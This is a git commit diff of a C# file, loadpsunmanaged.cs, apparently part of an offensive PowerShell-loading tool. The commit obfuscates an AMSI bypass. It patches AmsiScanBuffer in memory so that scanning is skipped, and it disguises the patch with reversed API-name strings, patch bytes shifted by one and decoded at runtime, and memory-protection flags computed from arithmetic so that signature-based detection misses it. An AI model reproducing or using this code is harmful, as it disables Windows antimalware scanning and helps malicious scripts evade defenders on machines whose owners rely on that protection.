32124a98c1b281616c225afcbf0c61cefa28feab
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2021-07-19 13:46:25 -0400

    Update loadpsunmanaged.cs

--- loadpsunmanaged.cs
+++ loadpsunmanaged.cs
@@ -17,21 +17,43 @@ namespace unmanagedps
         public static extern IntPtr LoadLibrary(string name);
         [DllImport("kernel32")]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
+        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);
+
         static void Main(string[] args)
         {
-            IntPtr amsi = LoadLibrary("amsi.dll");
-            IntPtr AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
-            Byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            char[] data = "lld.isma".ToCharArray();
+            Array.Reverse(data);
+            string name = new string(data);
+
+            IntPtr a = LoadLibrary(name);
+            data = "reffuBnacSismA".ToCharArray();
+            Array.Reverse(data);
+            name = new String(data);
+            IntPtr ptr = GetProcAddress(a, name);
+            Byte[] newbytes = { 0xB9, 0x58, 0x01, 0x08, 0x81, 0xC3, 0x19, 0x01 };
   
-            Console.WriteLine("amsi.dll!AmsiScanBuffer at 0x{0}", AmsiScanBuffer.ToString("X2"));
+            Console.WriteLine("patching offset 0x{0}", ptr.ToString("X2"));
 
             uint retval = 0;
+            uint newval = 0;
+            newval++;
+            newval += 3;
 
-            VirtualProtect(AmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out retval);
-            Marshal.Copy(patch, 0, AmsiScanBuffer, patch.Length);
-            VirtualProtect(AmsiScanBuffer, (UIntPtr)patch.Length, 0x20, out retval);
+            VirtualProtect(ptr, (UIntPtr)newbytes.Length, newval, out retval);
+            for (var i = 0; i < newbytes.Length; i++)
+            {
+                newbytes[i] = (byte)((int)newbytes[i] - 1);
+            }
+            Marshal.Copy(newbytes, 0, ptr, newbytes.Length);
+
+            newval += 28;
+            VirtualProtect(ptr, (UIntPtr)newbytes.Length, newval, out retval);
+           
 
             StringBuilder sb = new StringBuilder();
             try
